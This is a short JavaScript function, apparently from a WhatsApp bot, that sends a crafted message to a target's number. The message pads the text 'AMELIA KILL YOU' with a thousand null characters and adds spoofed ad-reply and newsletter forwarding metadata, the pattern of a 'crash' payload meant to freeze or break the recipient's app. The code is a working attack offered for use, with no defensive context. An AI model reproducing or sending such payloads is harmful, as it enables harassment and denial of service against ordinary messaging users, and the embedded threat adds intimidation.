async function XheavensdeeP(target) {
  await sock.relayMessage(target, {
    extendedTextMessage: {
      text: "AMELIA KILL YOU" + "\u0000".repeat(1000) + "https://wa.me/stickerpack/D7eppeli",
      matchedText: "https://wa.me/stickerpack/D7eppeli",
      description: "\u74A7",
      title: "YuukeyD7eppeli",
      previewType: "NONE",
      jpegThumbnail: "",
      inviteLinkGroupTypeV2: "DEFAULT", 
      contextInfo: {
        externalAdReply: {
          renderLargerThumbnail: true,
          thumbnailUrl: "https://wa.me/stickerpack/D7eppeli",
          sourceUrl: "https://wa.me/stickerpack/D7eppeli",
          showAdAttribution: true,
          body: "D | 7eppeli-Exposed",
          title: "I\'ll Never Let U Go Again...\n-( 7-Ydz )"
        }, 
        isForwarded: true,
        forwardingScore: 999,
        forwardedNewsletterMessageInfo: {
          newsletterName: "D | 7eppeli-Exploration",
          newsletterJid: "13135550002@newsletter",
          serverId:1
        }
      }
    }
  }, { participant: { jid:target } });
  
}